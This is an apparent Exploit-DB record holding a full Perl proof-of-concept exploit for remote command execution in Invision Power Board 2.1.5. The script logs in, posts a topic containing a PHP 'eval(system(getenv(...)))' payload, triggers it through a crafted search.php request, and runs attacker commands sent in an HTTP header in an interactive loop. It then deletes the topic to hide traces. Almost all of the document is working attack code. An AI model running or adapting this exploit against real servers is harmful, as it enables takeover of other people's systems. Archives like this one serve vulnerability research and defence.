{
  "id": "1726",
  "title": "Invision Power Board 2.1.5 - &#039;search.php&#039; Remote Code Execution",
  "cve": null,
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n# Wed Apr 26 16:44:15 CEST 2006 jolascoaga@514.es\r\n#\r\n# INVISION POWER BOARD 2.1.5 <www.invisionboard.com> pr00f 0f c0ncept\r\n#\r\n# remote command execution. vuln credits goes to IceShaman.\r\n#\r\n# works only if you have perms to post a comment. Exploit with replye is\r\n# in my TODO...\r\n#\r\n# 514 still r0xing.\r\n# !dSR the hardc0re hax0rs ;)\r\n# There is no kwel comments in this release, wait for next upgrade\r\n#######################################################################/\r\n\r\nuse LWP::UserAgent;\r\nuse HTTP::Cookies;\r\nuse LWP::Simple;\r\nuse HTTP::Request::Common \"POST\";\r\nuse HTTP::Response;\r\nuse Getopt::Long;\r\nuse strict;\r\n\r\n$| = 1; # ;1 = |$\r\n\r\nmy ($proxy,$proxy_user,$proxy_pass,$lang);\r\nmy ($arg_host,$debug,$ipb_user,$ipb_pass, $lang, $errors, $topic_index, $tmp_var);\r\nmy ($md5_key, $post_key, $tmp_var);\r\n\r\nmy %lang_es = (\r\n       'name' => 'Spanish Language',\r\n       'login' => \"Ahora est\u00e1s identificado\",\r\n       'incorrect' => \"Nombre de usuario o contrase\u00f1a incorrectos\",\r\n       'deleted' => \"Tema Eliminado\"\r\n);\r\n\r\nmy %lang_en = (\r\n       'name' => 'English language',\r\n       'login' =>  \"You are now logged in\",\r\n       'incorrect' => \"Sorry, we could not find a member using those log in details\",\r\n       'deleted'  => 'Topic Deleted',\r\n);\r\nmy %lang_strings = ();\r\n\r\nmy $ua = new LWP::UserAgent(\r\n           cookie_jar=> { file => \"$$.cookie\" });\r\n\r\nmy $options = GetOptions (\r\n 'host=s'            => \\$arg_host,\r\n 'proxy=s'           => \\$proxy,\r\n 'proxy_user=s'      => \\$proxy_user,\r\n 'proxy_pass=s'      => \\$proxy_pass,\r\n 'ipb_user=s'        => \\$ipb_user,\r\n 'ipb_pass=s'        => \\$ipb_pass,\r\n 'lang=s'            => \\$lang,\r\n 'errors'            => \\$errors,\r\n 'debug'             => \\$debug);\r\n\r\nmy ($host, $forum_index) = $arg_host =~ m/(http.*?)index.*?showforum=(.*)/;\r\nprint \"Host: $host\\nForum Index: $forum_index\\n\" if $debug;\r\n\r\n&help unless ($host);\r\n\r\n# w0w0w0w0w0 is smarter than some one i know :D\r\nif (!$lang) {\r\n       lang_autodetect();\r\n       print \"Detected lang is: $lang_strings{'name'}\\n\" if $debug;\r\n}\r\n\r\nwhile (1){\r\n   print \"invvy:\\\\> \";\r\n   my $cmd = <STDIN>;\r\n   &invvy($cmd);\r\n}\r\n\r\nsub invvy {\r\n       chomp (my $cmd = shift);\r\n       LWP::Debug::level('+') if $debug;\r\n\r\n       $ua->agent(\"Morzilla/5.0 (THIS IS AN EXPLOIT. IDS, PLZ, Gr4b ME!!!\");\r\n\r\n       $ua->proxy(['http'] => $proxy) if $proxy;\r\n       my $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;\r\n\r\n       ipb_login (); # This works with redirects enabled/disabled\r\n\r\n\r\n       ipb_post(); # Post in a main forum.\r\n\r\n       ipb_exec ($cmd);\r\n\r\n       ipb_delete ($forum_index, $topic_index);\r\n}\r\n# guglucitos team presents:\r\n\r\nsub help {\r\n   print \"Syntax: ./$0 <url> [options]\\n\";\r\n   print \"\\t--ipb_user, --ipb_pass  (needed if dont allow anonymous posts)\\n\";\r\n   print \"\\t--proxy (http), --proxy_user, --proxy_pass\\n\";\r\n   print \"\\t--lang=[es|en] (default: autodetect)\\n\";\r\n   print \"\\t--debug\\n\";\r\n   print \"\\nExample\\n\";\r\n   print \"bash# $0 --host=http://www.somehost.com/index.php?showforum=2\\n\";\r\n   print \"\\n\";\r\n   exit(1);\r\n}\r\n\r\n# sponsorized by coca-cola\r\nsub lang_autodetect {\r\n\r\n   my $req = HTTP::Request->new (GET => $host.\"/index.php\");\r\n   $ua->proxy(['http'] => $proxy) if $proxy;\r\n   $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;\r\n\r\n   print $req->as_string() if $debug;\r\n\r\n   my $res = $ua->request($req);\r\n   my $html = $res->content();\r\n\r\n   if (($html =~ /Bienvenido,/) or  ($html =~ /Fecha y Hora actual/)) {\r\n               %lang_strings =  %lang_es;\r\n               return;\r\n   }\r\n   if (($html =~ /Welcome,/) or ($html =~ /Time is now/)) {\r\n               %lang_strings = %lang_en;\r\n               return;\r\n   }\r\n   print \"Unknown lang switching to default: 'english'\\n\";\r\n   %lang_strings =  %lang_en;\r\n}\r\n\r\n# login function for 2.1.5\r\nsub ipb_login {\r\n       my $content;\r\n       my $h = $host.\"/index.php?act=Login&CODE=01\";\r\n       print $h . \"\\n\" if $debug;\r\n       my $req = POST $h,[\r\n               'referer' => $host,\r\n               'UserName' => $ipb_user,\r\n               'PassWord' => $ipb_pass,\r\n               'CookieDate' => 1\r\n               ]; #grab these, and send to dsr!\r\n       print $req->as_string() if $debug;\r\n       my $res = $ua->request($req);\r\n       if ($errors) {\r\n               print \"[+] Context: Login in\\n\";\r\n               print \"HTTP Error code: \".$res->code().\"\\n\";\r\n               print \"HTTP Location: \".$res->header(\"Location\").\"\\n\";\r\n               my ($error) = $res->content() =~ m/<body>(.*?)<\\/body>/s;\r\n               print \"- ERROR -\\nFind string: \".$lang_strings{'login'}.\"\\n$error\\n- ERROR -\\n\";\r\n       }\r\n       if ($res->code() eq 302) {\r\n               $content = redirect ($res->header(\"Location\"));\r\n\r\n       } else {\r\n\r\n               $content = $res->content();\r\n       }\r\n\r\n       if ($content =~ /$lang_strings{'login'}/ or $content =~ /Logged in as/) {\r\n           print \"Logged in\\n\" if $errors;\r\n       } else {\r\n          die \"Can't log in\\n\";\r\n       }\r\n\r\n}\r\n\r\nsub redirect {\r\n   my ($addr) = @_;\r\n   my $req = HTTP::Request->new (GET => $addr);\r\n   $ua->proxy(['http'] => $proxy) if $proxy;\r\n   $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;\r\n\r\n   print $req->as_string() if $debug; # MKSINK is r0xer\r\n\r\n   my $res = $ua->request($req);\r\n   my $html = $res->content();\r\n\r\n   return $html;\r\n}\r\n\r\nsub ipb_post {\r\n       # This is for posting into a main index.\r\n\r\n       my $h = $host.\"/index.php?act=post&do=new_post&f=\".$forum_index;\r\n\r\n       my $req = HTTP::Request->new (GET => $h);\r\n       $ua->proxy(['http'] => $proxy) if $proxy;\r\n       $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;\r\n\r\n       print $req->as_string() if $debug; #dirty_epic r0x++\r\n\r\n       my $res = $ua->request($req);\r\n       my $html = $res->content();\r\n\r\n       ($md5_key) = $html =~ m/var ipb_md5_check\\s+= \\\"(.*?)\\\"/;\r\n       ($post_key) = $html =~ m/post_key' value='(.*?)'/;\r\n\r\n       print \"AUTH check: $md5_key\\n\" if $debug;\r\n       print \"POST key: $post_key\\n\" if $debug;\r\n\r\n       $tmp_var = int(rand(31337));\r\n       my $exploitme = 'eval(system(getenv(HTTP_'.$tmp_var.'))); //'; # seeeeeei la weeeeei\r\n       $h = $host.\"/index.php\";\r\n\r\n       print $h.\"\\n\" if $debug;\r\n\r\n       my $req = POST $h, [\r\n               'st' => 0,\r\n               'act' => \"Post\",\r\n               's' => '',\r\n               'f' => $forum_index,\r\n               'auth_key' => $md5_key,\r\n               'removeattachid' => 0,\r\n               'MAX_FILE_SIZE' => 51200000,\r\n               'CODE' => '01',\r\n               'post_key' => $post_key,\r\n               'TopicTitle' => '514 pwned',\r\n               'TopicDesc' => '',\r\n               'poll_question' => '',\r\n               'ffont' => 0,\r\n               'fsize' => 0,\r\n               'Post' => $exploitme,\r\n               'post_htmlstatus' => 0,\r\n               'enableemo' => 'yes',\r\n               'enablesig' => 'yes',\r\n               'mod_options' => 'nowt',\r\n               'iconid' => 0,\r\n               'dosubmit' => 'Post New Topic'\r\n               ];\r\n\r\n       $ua->proxy(['http'] => $proxy) if $proxy;\r\n       $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;\r\n\r\n       print $req->as_string() if $debug;\r\n       my $res = $ua->request($req);\r\n       my $html = $res->content();\r\n\r\n       print \"Location: \".$res->header(\"Location\") if $debug;\r\n       ($topic_index) = $res->header(\"Location\") =~ m/showtopic=(\\d+)/;\r\n       if ($errors) {\r\n               print \"[+] Context: Creating post\\n\";\r\n               print \"HTTP Error code: \".$res->code().\"\\n\";\r\n               print \"HTTP Location: \".$res->header(\"Location\").\"\\n\";\r\n               print \"Topic Index: \".$topic_index.\"\\n\";\r\n               my ($error) = $res->content() =~ m/<body>(.*?)<\\/body>/s;\r\n               print \"- ERROR -\\nFind string: none\\n$error\\n- ERROR -\\n\";\r\n       }\r\n\r\n}\r\n\r\nsub ipb_delete {\r\n       my ($fid, $tid) = @_;\r\n       my $req;\r\n       print \"Deleting Topic: $tid from forum: $fid\\n\" if $debug;\r\n\r\n       my $h = $host.\"/index.php\";\r\n       $req = POST $h, [\r\n                       'st' => 0,\r\n                       'act' => 'mod',\r\n                       'f' => $fid,\r\n                       'auth_key' => $md5_key,\r\n                       'CODE' => '08',\r\n                       't' => $tid,\r\n                       'submit' => 'Delete this topic'\r\n               ]; # fuck windows automatic reboot\r\n       print $req->as_string() if $debug;\r\n       $ua->proxy(['http'] => $proxy) if $proxy;\r\n       $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;\r\n\r\n       my $res = $ua->request($req);\r\n\r\n       if ($errors) {\r\n               print \"[+] Context: Deleting Topic\\n\";\r\n               print \"HTTP Error code: \".$res->code().\"\\n\";\r\n               print \"HTTP Location: \".$res->header(\"Location\").\"\\n\";\r\n               print \"Topic Index: \".$topic_index.\"\\n\";\r\n               my ($error) = $res->content() =~ m/<body>(.*?)<\\/body>/s;\r\n               print \"- ERROR -\\nFind string: \".$lang_strings{'deleted'}.\"\\n$error\\n- ERROR -\\n\";\r\n       }\r\n       # yow yow\r\n       if ($res->code() eq 200) {\r\n                if ($res->content() =~ /$lang_strings{'deleted'}/) {\r\n                       print \"Topic $topic_index deleted\\n\" if $errors;\r\n               } else {\r\n                       print \"Maybe there was errors deleting post: $topic_index\\n\" if $errors;\r\n               }\r\n       }\r\n}\r\n\r\n# shhhhh this is hidden\r\nsub ipb_exec {\r\n       my ($cmd) = @_;\r\n       my $h = $host.\"/index.php?act=Search&CODE=01\";\r\n       my $req = POST $h, [\r\n                       'keywords' => \"HTTP_\".$tmp_var,\r\n                       'namesearch' => '',\r\n                       'forums[]' => $forum_index,\r\n                       'prune' => 0,\r\n                       'prune_type' => 'newer',\r\n                       'result_type' => 'posts',\r\n                       'search_in' => 'posts',\r\n                       'sort_key' => 'last_post',\r\n                       'searchsubs' => '1'\r\n               ];\r\n       print $req->as_string() if $debug;\r\n       $ua->proxy(['http'] => $proxy) if $proxy;\r\n       $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;\r\n\r\n       my $res = $ua->request($req);\r\n       my $html = $res->content();\r\n\r\n       my ($redir) = $html =~ m/url_bit.*?\\\"(.*?)\\\"/;\r\n       print \"Redirect to: $redir\\n\" if $errors; # don't ask\r\n\r\n       if ($errors) {\r\n               print \"[+] Context: First search\\n\";\r\n               print \"HTTP Error code: \".$res->code().\"\\n\";\r\n               print \"HTTP Location: \".$res->header(\"Location\").\"\\n\";\r\n               print \"Topic Index: \".$topic_index.\"\\n\";\r\n               my ($error) = $res->content() =~ m/<body>(.*?)<\\/body>/s;\r\n               print \"- ERROR -\\nFind string: none\\n$error\\n- ERROR -\\n\";\r\n       }\r\n\r\n       if ($res->code eq 302) {\r\n               $redir = $res->header(\"Location\");\r\n       }\r\n\r\n       # piere - tonite is a great song\r\n       my $req = HTTP::Request->new (GET => $redir.'&lastdate=z|eval.*?%20//)%23e%00');\r\n       $ua->proxy(['http'] => $proxy) if $proxy;\r\n       $req->header($tmp_var => 'echo STARTXPL;'.$cmd.';echo ENDXPL');\r\n       $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;\r\n\r\n       print $req->as_string() if $debug;\r\n\r\n       my $res = $ua->request($req);\r\n       my $html = $res->content();\r\n\r\n       $html =~ m/STARTXPL(.*?)ENDXPL/s;\r\n       print $1.\"\\n\";\r\n\r\n       # no matter with you\r\n       if ($errors) {\r\n               print \"[+] Context: Executed\\n\";\r\n               print \"HTTP Error code: \".$res->code().\"\\n\";\r\n               print \"HTTP Location: \".$res->header(\"Location\").\"\\n\";\r\n               print \"Topic Index: \".$topic_index.\"\\n\";\r\n               my ($error) = $res->content() =~ m/<body>(.*?)<\\/body>/s;\r\n               print \"- ERROR -\\nFind string: none\\n$error\\n- ERROR -\\n\";\r\n       }\r\n\r\n}\r\n# be aware with la roca peoplee\r\n\r\n# milw0rm.com [2006-04-29]",
  "url": "https://www.exploit-db.com/exploits/1726"
}